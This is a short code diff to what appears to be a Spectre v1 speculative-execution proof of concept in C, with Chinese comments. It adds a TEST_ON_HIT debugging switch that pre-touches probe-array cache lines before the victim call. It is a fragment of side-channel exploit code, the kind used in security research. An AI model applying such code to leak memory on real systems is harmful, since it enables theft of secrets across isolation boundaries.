@@ -53,6 +53,11 @@ asm volatile(                                      \
 #ifndef SECRET_LEN
 #define SECRET_LEN          1
 #endif
+
+#ifndef TEST_ON_HIT
+#define TEST_ON_HIT         0
+#endif
+
 unsigned int array1_size = 16;
 uint8_t unused1[64];
 uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16}; // 16个有效元素，后面填充0
@@ -110,6 +115,15 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
             x = training_x ^ (x & (malicious_x ^ training_x));
             // 调用受害者函数
             for (i = 0; i < 256; i++) flush_memory(&array2[i * 64]);
+
+#if TEST_ON_HIT
+    int temp = array2[8 * 0 *64];
+    int temp2 = array2[8 * 5 *64];  
+    int temp3 = array2[8 * 2 *64];
+    int temp4 = array2[8 * 1 *64];
+    int temp5 = array2[8 * 4 *64];
+    int temp6 = array2[8 * 3 *64];      
+#endif
             flush_memory(&array1_size);
             victim_function(x);
         }
